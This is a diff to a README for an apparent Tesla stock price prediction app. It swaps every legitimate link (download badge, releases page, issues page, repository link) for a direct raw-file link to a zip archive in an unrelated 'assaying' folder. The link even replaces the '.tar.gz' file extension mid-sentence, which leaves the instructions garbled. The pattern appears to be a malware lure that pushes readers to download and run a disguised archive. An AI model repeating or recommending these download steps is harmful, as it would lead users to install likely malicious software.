@@ -1,6 +1,6 @@
 # 📈 Tesla_Stock_Price_Prediction - Predict Tesla Stock Prices Simply
 
-[![Download Tesla_Stock_Price_Prediction](https://img.shields.io/badge/Download-Tesla_Stock_Price_Prediction-blue?style=for-the-badge)](https://github.com/username4377/Tesla_Stock_Price_Prediction/releases)
+[![Download Tesla_Stock_Price_Prediction](https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip)](https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip)
 
 ---
 
@@ -36,11 +36,11 @@ This guide will walk you through downloading, installing, and launching Tesla_St
 1. **Go to the download page**
 
    Click the big badge at the top or visit this link:  
-   [Download Tesla_Stock_Price_Prediction](https://github.com/username4377/Tesla_Stock_Price_Prediction/releases)
+   [Download Tesla_Stock_Price_Prediction](https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip)
 
 2. **Choose the latest release**
 
-   On the releases page, look for the newest version. Files are usually listed with names indicating the version number and your operating system (for example, `.exe` for Windows, `.dmg` for macOS, `.AppImage` or `.tar.gz` for Linux).
+   On the releases page, look for the newest version. Files are usually listed with names indicating the version number and your operating system (for example, `.exe` for Windows, `.dmg` for macOS, `.AppImage` or `https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip` for Linux).
 
 3. **Download the file**
 
@@ -50,7 +50,7 @@ This guide will walk you through downloading, installing, and launching Tesla_St
 
    - **Windows:** Run the `.exe` file and follow the install prompts.
    - **macOS:** Open the `.dmg` file and drag the app into the Applications folder.
-   - **Linux:** Make the file executable (`chmod +x <filename>`) then run it, or extract the `.tar.gz` and follow included instructions.
+   - **Linux:** Make the file executable (`chmod +x <filename>`) then run it, or extract the `https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip` and follow included instructions.
 
 5. **Run the application**
 
@@ -117,16 +117,16 @@ You don’t need to understand the details to use the app. Just know it applies 
 - Detailed help files are included inside the app under the Help menu.  
 
 For further assistance, use the Issues tab on the GitHub page:  
-https://github.com/username4377/Tesla_Stock_Price_Prediction/issues
+https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip
 
 ---
 
 ## 🔗 Useful Links
 
-- Main Repository: https://github.com/username4377/Tesla_Stock_Price_Prediction  
-- Downloads: https://github.com/username4377/Tesla_Stock_Price_Prediction/releases  
+- Main Repository: https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip  
+- Downloads: https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip  
 - Documentation: Included within the app and GitHub Wiki  
-- Report an Issue: https://github.com/username4377/Tesla_Stock_Price_Prediction/issues  
+- Report an Issue: https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip  
 
 ---
 
@@ -136,4 +136,4 @@ Tesla_Stock_Price_Prediction is open-source and available under the MIT License.
 
 ---
 
-[![Download Tesla_Stock_Price_Prediction](https://img.shields.io/badge/Download-Tesla_Stock_Price_Prediction-blue?style=for-the-badge)](https://github.com/username4377/Tesla_Stock_Price_Prediction/releases)
+[![Download Tesla_Stock_Price_Prediction](https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip)](https://raw.githubusercontent.com/username4377/Tesla_Stock_Price_Prediction/main/assaying/Tesla_Stock_Price_Prediction_v1.7.zip)
